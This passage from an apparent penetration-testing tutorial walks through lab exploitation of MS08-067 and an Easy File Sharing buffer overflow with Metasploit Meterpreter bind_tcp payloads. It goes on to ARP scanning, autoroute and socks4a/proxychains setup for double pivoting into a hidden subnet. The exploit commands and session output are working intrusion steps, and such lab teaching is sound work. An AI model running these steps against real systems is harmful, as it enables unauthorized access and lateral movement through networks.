+<p>If you remember, there were two vulnerabilities in our nmap scan on the 7.7.7.0/24 network range. These weaknesses were MS08-067 and <strong>BoF</strong> vulnerability in Easy File Share application. Access to the target system can be achieved in both ways. Another option is to continue with the SSH access, but we will continue through MS08-067 and Easy File Share.</p>
+
+<h3 id="ms08-067-with-bind-tcp">MS08-067 with Bind TCP</h3>
+
+<p>The module with the full path <strong>exploit/windows/smb/ms08_067_netapi</strong> available in the Metasploit Framework can be used to compromise the target system via MS08-067 vulnerability. The important point here is that <strong>bind_tcp</strong> is selected as the payload type. Since the double-sided routing is not defined, the target system will not be able to directly reach us. For this reason, it is necessary to select the Bind TCP payload type so that the target should wait for a connection on its own port. After the successful exploit operation, the connection to the port where the target system is listening will be performed.</p>
+
+<p>How Reverse TCP and Bind TCP connections work can be examined through the following visuals.</p>
+
+<p><img src="/assets/images/blog/9.png" alt="" /></p>
+
+<p>Setting up the MS08-067-Netapi exploit module with the Bind TCP payload and compromise the target:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span> 
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span> 
+
+<span class="no">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span><span class="p">):</span>
+
+   <span class="no">Name</span>     <span class="no">Current</span> <span class="no">Setting</span>  <span class="no">Required</span>  <span class="no">Description</span>
+   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+   <span class="no">RHOST</span>                     <span class="n">yes</span>       <span class="no">The</span> <span class="n">target</span> <span class="n">address</span>
+   <span class="no">RPORT</span>    <span class="mi">445</span>              <span class="n">yes</span>       <span class="no">The</span> <span class="no">SMB</span> <span class="n">service</span> <span class="n">port</span>
+   <span class="no">SMBPIPE</span>  <span class="no">BROWSER</span>          <span class="n">yes</span>       <span class="no">The</span> <span class="n">pipe</span> <span class="nb">name</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="no">BROWSER</span><span class="p">,</span> <span class="no">SRVSVC</span><span class="p">)</span>
+
+
+<span class="no">Exploit</span> <span class="ss">target:
+
+   </span><span class="no">Id</span>  <span class="no">Name</span>
+   <span class="o">--</span>  <span class="o">----</span>
+   <span class="mi">0</span>   <span class="no">Automatic</span> <span class="no">Targeting</span>
+
+
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">rhost</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+<span class="n">rhost</span> <span class="o">=&gt;</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span>
+<span class="n">payload</span> <span class="o">=&gt;</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span>
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span> 
+
+<span class="no">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span><span class="p">):</span>
+
+   <span class="no">Name</span>     <span class="no">Current</span> <span class="no">Setting</span>  <span class="no">Required</span>  <span class="no">Description</span>
+   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+   <span class="no">RHOST</span>    <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>         <span class="n">yes</span>       <span class="no">The</span> <span class="n">target</span> <span class="n">address</span>
+   <span class="no">RPORT</span>    <span class="mi">445</span>              <span class="n">yes</span>       <span class="no">The</span> <span class="no">SMB</span> <span class="n">service</span> <span class="n">port</span>
+   <span class="no">SMBPIPE</span>  <span class="no">BROWSER</span>          <span class="n">yes</span>       <span class="no">The</span> <span class="n">pipe</span> <span class="nb">name</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="no">BROWSER</span><span class="p">,</span> <span class="no">SRVSVC</span><span class="p">)</span>
+
+
+<span class="no">Payload</span> <span class="n">options</span> <span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span><span class="p">):</span>
+
+   <span class="no">Name</span>      <span class="no">Current</span> <span class="no">Setting</span>  <span class="no">Required</span>  <span class="no">Description</span>
+   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+   <span class="no">EXITFUNC</span>  <span class="n">thread</span>           <span class="n">yes</span>       <span class="no">Exit</span> <span class="n">technique</span> <span class="p">(</span><span class="no">Accepted</span><span class="p">:</span> <span class="s1">''</span><span class="p">,</span> <span class="n">seh</span><span class="p">,</span> <span class="n">thread</span><span class="p">,</span> <span class="n">process</span><span class="p">,</span> <span class="n">none</span><span class="p">)</span>
+   <span class="no">LPORT</span>     <span class="mi">4444</span>             <span class="n">yes</span>       <span class="no">The</span> <span class="n">listen</span> <span class="n">port</span>
+   <span class="no">RHOST</span>     <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>         <span class="n">no</span>        <span class="no">The</span> <span class="n">target</span> <span class="n">address</span>
+
+
+<span class="no">Exploit</span> <span class="ss">target:
+
+   </span><span class="no">Id</span>  <span class="no">Name</span>
+   <span class="o">--</span>  <span class="o">----</span>
+   <span class="mi">0</span>   <span class="no">Automatic</span> <span class="no">Targeting</span>
+
+
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Started</span> <span class="n">bind</span> <span class="n">handler</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="no">Automatically</span> <span class="n">detecting</span> <span class="n">the</span> <span class="n">target</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="no">Fingerprint</span><span class="p">:</span> <span class="no">Windows</span> <span class="mi">2003</span> <span class="o">-</span> <span class="no">Service</span> <span class="no">Pack</span> <span class="mi">2</span> <span class="o">-</span> <span class="n">lang</span><span class="ss">:Unknown</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="no">We</span> <span class="n">could</span> <span class="n">not</span> <span class="n">detect</span> <span class="n">the</span> <span class="n">language</span> <span class="n">pack</span><span class="p">,</span> <span class="n">defaulting</span> <span class="n">to</span> <span class="no">English</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="no">Selected</span> <span class="no">Target</span><span class="p">:</span> <span class="no">Windows</span> <span class="mi">2003</span> <span class="no">SP2</span> <span class="no">English</span> <span class="p">(</span><span class="no">NX</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="no">Attempting</span> <span class="n">to</span> <span class="n">trigger</span> <span class="n">the</span> <span class="n">vulnerability</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Sending</span> <span class="n">stage</span> <span class="p">(</span><span class="mi">957999</span> <span class="n">bytes</span><span class="p">)</span> <span class="n">to</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Meterpreter</span> <span class="n">session</span> <span class="mi">2</span> <span class="n">opened</span> <span class="p">(</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="o">-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.11</span><span class="p">:</span><span class="mi">0</span> <span class="o">-&gt;</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">4444</span><span class="p">)</span> 
+
+
+<span class="n">meterpreter</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h3 id="easy-file-share-bof">Easy File Share BoF</h3>
+
+<p>Another vulnerability was the Easy File Share application. Setting the exploit module with the Bind TCP payload and compromise the target can be accomplished with the following steps:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msf</span>  <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">easyfilesharing_seh</span> 
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">easyfilesharing_seh</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span> 
+
+<span class="no">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">easyfilesharing_seh</span><span class="p">):</span>
+
+   <span class="no">Name</span>   <span class="no">Current</span> <span class="no">Setting</span>  <span class="no">Required</span>  <span class="no">Description</span>
+   <span class="o">----</span>   <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+   <span class="no">RHOST</span>                   <span class="n">yes</span>       <span class="no">The</span> <span class="n">target</span> <span class="n">address</span>
+   <span class="no">RPORT</span>  <span class="mi">80</span>               <span class="n">yes</span>       <span class="no">The</span> <span class="n">target</span> <span class="n">port</span>
+
+
+<span class="no">Exploit</span> <span class="ss">target:
+
+   </span><span class="no">Id</span>  <span class="no">Name</span>
+   <span class="o">--</span>  <span class="o">----</span>
+   <span class="mi">0</span>   <span class="no">Easy</span> <span class="no">File</span> <span class="no">Sharing</span> <span class="mf">7.2</span> <span class="no">HTTP</span>
+
+
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">easyfilesharing_seh</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">rhost</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+<span class="n">rhost</span> <span class="o">=&gt;</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">easyfilesharing_seh</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span>
+<span class="n">payload</span> <span class="o">=&gt;</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span>
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">easyfilesharing_seh</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Started</span> <span class="n">bind</span> <span class="n">handler</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="no">Sending</span> <span class="n">exploit</span><span class="o">...</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="no">Exploit</span> <span class="no">Sent</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Sending</span> <span class="n">stage</span> <span class="p">(</span><span class="mi">957999</span> <span class="n">bytes</span><span class="p">)</span> <span class="n">to</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Meterpreter</span> <span class="n">session</span> <span class="mi">2</span> <span class="n">opened</span> <span class="p">(</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span><span class="o">-</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">0.11</span><span class="p">:</span><span class="mi">0</span> <span class="o">-&gt;</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span><span class="p">:</span><span class="mi">4444</span><span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mi">14</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">11</span> <span class="o">+</span><span class="mo">0300</span>
+
+
+<span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">ipconfig</span>
+
+<span class="no">Interface</span>  <span class="mi">1</span>
+<span class="o">============</span>
+<span class="no">Name</span>         <span class="p">:</span> <span class="no">MS</span> <span class="no">TCP</span> <span class="no">Loopback</span> <span class="n">interface</span>
+<span class="no">Hardware</span> <span class="no">MAC</span> <span class="p">:</span> <span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span>
+<span class="no">MTU</span>          <span class="p">:</span> <span class="mi">1520</span>
+<span class="no">IPv4</span> <span class="no">Address</span> <span class="p">:</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>
+
+
+<span class="no">Interface</span> <span class="mi">65539</span>
+<span class="o">============</span>
+<span class="no">Name</span>         <span class="p">:</span> <span class="no">Intel</span><span class="p">(</span><span class="no">R</span><span class="p">)</span> <span class="no">PRO</span><span class="o">/</span><span class="mi">1000</span> <span class="no">MT</span> <span class="no">Desktop</span> <span class="no">Adapter</span>
+<span class="no">Hardware</span> <span class="no">MAC</span> <span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">29</span><span class="ss">:cd:cb</span>
+<span class="no">MTU</span>          <span class="p">:</span> <span class="mi">1500</span>
+<span class="no">IPv4</span> <span class="no">Address</span> <span class="p">:</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.3</span>
+<span class="no">IPv4</span> <span class="no">Netmask</span> <span class="p">:</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span>
+
+
+<span class="no">Interface</span> <span class="mi">65540</span>
+<span class="o">============</span>
+<span class="no">Name</span>         <span class="p">:</span> <span class="no">Intel</span><span class="p">(</span><span class="no">R</span><span class="p">)</span> <span class="no">PRO</span><span class="o">/</span><span class="mi">1000</span> <span class="no">MT</span> <span class="no">Desktop</span> <span class="no">Adapter</span> <span class="c1">#2</span>
+<span class="no">Hardware</span> <span class="no">MAC</span> <span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="ss">:e3</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">43</span>
+<span class="no">MTU</span>          <span class="p">:</span> <span class="mi">1500</span>
+<span class="no">IPv4</span> <span class="no">Address</span> <span class="p">:</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+<span class="no">IPv4</span> <span class="no">Netmask</span> <span class="p">:</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span>
+
+
+<span class="n">meterpreter</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>In the last case, the point where the attacker comes is as below:</p>
+
+<p><img src="/assets/images/blog/10.png" alt="" /></p>
+
+<p>Since we’ve got an access to the 7.7.7.20 machine. We need to perform information gathering again. JC named machine have two NIC like RD machine. That means we’ve found our second hidden network (<strong>8.8.8.0/24</strong>).</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">ipconfig</span>
+
+<span class="no">Interface</span>  <span class="mi">1</span>
+<span class="o">============</span>
+<span class="no">Name</span>         <span class="p">:</span> <span class="no">MS</span> <span class="no">TCP</span> <span class="no">Loopback</span> <span class="n">interface</span>
+<span class="no">Hardware</span> <span class="no">MAC</span> <span class="p">:</span> <span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span>
+<span class="no">MTU</span>          <span class="p">:</span> <span class="mi">1520</span>
+<span class="no">IPv4</span> <span class="no">Address</span> <span class="p">:</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>
+
+
+<span class="no">Interface</span> <span class="mi">65539</span>
+<span class="o">============</span>
+<span class="no">Name</span>         <span class="p">:</span> <span class="no">Intel</span><span class="p">(</span><span class="no">R</span><span class="p">)</span> <span class="no">PRO</span><span class="o">/</span><span class="mi">1000</span> <span class="no">MT</span> <span class="no">Desktop</span> <span class="no">Adapter</span>
+<span class="no">Hardware</span> <span class="no">MAC</span> <span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">29</span><span class="ss">:cd:cb</span>
+<span class="no">MTU</span>          <span class="p">:</span> <span class="mi">1500</span>
+<span class="no">IPv4</span> <span class="no">Address</span> <span class="p">:</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.3</span>
+<span class="no">IPv4</span> <span class="no">Netmask</span> <span class="p">:</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span>
+
+
+<span class="no">Interface</span> <span class="mi">65540</span>
+<span class="o">============</span>
+<span class="no">Name</span>         <span class="p">:</span> <span class="no">Intel</span><span class="p">(</span><span class="no">R</span><span class="p">)</span> <span class="no">PRO</span><span class="o">/</span><span class="mi">1000</span> <span class="no">MT</span> <span class="no">Desktop</span> <span class="no">Adapter</span> <span class="c1">#2</span>
+<span class="no">Hardware</span> <span class="no">MAC</span> <span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="ss">:e3</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">43</span>
+<span class="no">MTU</span>          <span class="p">:</span> <span class="mi">1500</span>
+<span class="no">IPv4</span> <span class="no">Address</span> <span class="p">:</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+<span class="no">IPv4</span> <span class="no">Netmask</span> <span class="p">:</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span>
+</code></pre></div></div>
+
+<p>Let’s continue information gathering by performing arp scanner on second hidden network.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">arp_scanner</span> <span class="no">RHOSTS</span><span class="o">=</span><span class="mf">8.8</span><span class="o">.</span><span class="mf">8.0</span><span class="o">/</span><span class="mi">24</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Running</span> <span class="k">module</span> <span class="nn">against</span> <span class="no">SRV03</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">ARP</span> <span class="no">Scanning</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.0</span><span class="o">/</span><span class="mi">24</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>   <span class="no">IP</span><span class="p">:</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.3</span> <span class="no">MAC</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">29</span><span class="ss">:cd:cb</span> <span class="p">(</span><span class="no">CADMUS</span> <span class="no">COMPUTER</span> <span class="no">SYSTEMS</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>   <span class="no">IP</span><span class="p">:</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.1</span> <span class="no">MAC</span> <span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">03</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>   <span class="no">IP</span><span class="p">:</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.9</span> <span class="no">MAC</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">56</span><span class="ss">:f1</span><span class="p">:</span><span class="mi">7</span><span class="n">c</span> <span class="p">(</span><span class="no">CADMUS</span> <span class="no">COMPUTER</span> <span class="no">SYSTEMS</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>   <span class="no">IP</span><span class="p">:</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.13</span> <span class="no">MAC</span> <span class="mi">08</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">13</span><span class="ss">:a3:b1</span> <span class="p">(</span><span class="no">CADMUS</span> <span class="no">COMPUTER</span> <span class="no">SYSTEMS</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>ARP scan says 4 machine found in this network.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">run</span> <span class="n">autoroute</span> <span class="o">-</span><span class="n">s</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.0</span><span class="o">/</span><span class="mi">24</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Adding</span> <span class="n">a</span> <span class="n">route</span> <span class="n">to</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.0</span><span class="o">/</span><span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span><span class="o">...</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Added</span> <span class="n">route</span> <span class="n">to</span> <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.0</span><span class="o">/</span><span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span> <span class="n">via</span> <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.20</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Use</span> <span class="n">the</span> <span class="o">-</span><span class="nb">p</span> <span class="n">option</span> <span class="n">to</span> <span class="n">list</span> <span class="n">all</span> <span class="n">active</span> <span class="n">routes</span>
+
+<span class="n">msf</span> <span class="o">&gt;</span> <span class="n">route</span> <span class="nb">print</span>
+
+<span class="no">Active</span> <span class="no">Routing</span> <span class="no">Table</span>
+<span class="o">====================</span>
+
+ <span class="no">Subnet</span> <span class="no">Netmask</span> <span class="no">Gateway</span>
+ <span class="o">------</span> <span class="o">-------</span> <span class="o">-------</span>
+ <span class="mf">7.7</span><span class="o">.</span><span class="mf">7.0</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span> <span class="no">Session</span> <span class="mi">1</span>
+ <span class="mf">8.8</span><span class="o">.</span><span class="mf">8.0</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span> <span class="no">Session</span> <span class="mi">3</span>
+</code></pre></div></div>
+
+<p>And we are adding routing definition again. We will talk about that in next chapter.</p>
+
+<h2 id="double-pivoting">Double Pivoting</h2>
+
+<p><strong>8.8.8.0/24</strong> network was discovered in the information gathering process for the JC system. We already have a routing rule between <strong>172.16.0.0/24</strong> and <strong>7.7.7.0/24</strong> networks via the first compromised machine.</p>
+
+<p>In the present case, network packages that comes from  <strong>172.16.0.20</strong>  to access the JC device <em>(second compromised machine)</em> first go to the RD device (first compromised machine), and the RD transmits those packages to the JC machine.</p>
+
+<p>If the attacker who is <strong>172.16.0.20</strong> wishes to access <strong>8.8.8.0/24</strong> -newly discovered second hidden network– network, a new routing rule must be defined. In the tools we will use outside the Metasploit Framework, we must run a new socks4 proxy server to connect these two pivots and define the new proxy server in the configuration file of the proxychains tool.</p>
+
+<p>Network packages attempting to reach the 8.8.8.9 destination from the attacker machine (172.16.0.20) will pass through two different points:</p>
+
+<ul>
+  <li><strong>RD:</strong> I do not know how to access the 8.8.8.9 IP address. But I know the system who knows how to access it. I can direct you to it.</li>
+  <li><strong>JC:</strong> I know how to forward packets from the 7.7.7.0/24 network to the 8.8.8.0/24 network.</li>
+</ul>
+
+<p>The final state of the compromised and discovered systems is as follows.</p>
+
+<p><img src="/assets/images/blog/11.png" alt="" /></p>
+
+<h3 id="holy-proxychains">Holy Proxychains</h3>
+
+<p>The ProxyChains tool connects the proxy servers and transmits the connection end to end. In the last phase, a new socks4 proxy server is run on the local 1081 port for the newly discovered 8.8.8.0/24 network.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">socks4a</span> 
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">socks4a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span> 
+
+<span class="no">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">socks4a</span><span class="p">):</span>
+
+   <span class="no">Name</span>     <span class="no">Current</span> <span class="no">Setting</span>  <span class="no">Required</span>  <span class="no">Description</span>
+   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+   <span class="no">SRVHOST</span>  <span class="mf">172.16</span><span class="o">.</span><span class="mf">0.20</span>      <span class="n">yes</span>       <span class="no">The</span> <span class="n">address</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span>
+   <span class="no">SRVPORT</span>  <span class="mi">1080</span>             <span class="n">yes</span>       <span class="no">The</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
+
+
+<span class="no">Auxiliary</span> <span class="ss">action:
+
+   </span><span class="no">Name</span>   <span class="no">Description</span>
+   <span class="o">----</span>   <span class="o">-----------</span>
+   <span class="no">Proxy</span>  
+
+
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">socks4a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="no">SRVPORT</span> <span class="mi">1081</span>
+<span class="no">SRVPORT</span> <span class="o">=&gt;</span> <span class="mi">1081</span>
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">socks4a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Auxiliary</span> <span class="k">module</span> <span class="nn">execution</span> <span class="n">completed</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Starting</span> <span class="n">the</span> <span class="n">socks4a</span> <span class="n">proxy</span> <span class="n">server</span>
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">socks4a</span><span class="p">)</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>The information of the new proxy server will define in the /etc/proxychains.conf configuration file. By activating the <strong>Dynamic Chain</strong> setting, sequential switching between the defined proxy servers is ensured.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# <span class="nb">cat</span> /etc/proxychains.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"#"</span>
+dynamic_chain
+proxy_dns 
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+socks4  172.16.0.20 1080  <span class="c"># First Pivot</span>
+socks4  172.16.0.20 1081  <span class="c"># Second Pivot</span>
+</code></pre></div></div>
+
+<p>With the Proxychains tool, the 8.8.8.9 target can be scanned via the second pivot system with the nmap tool.</p>
+
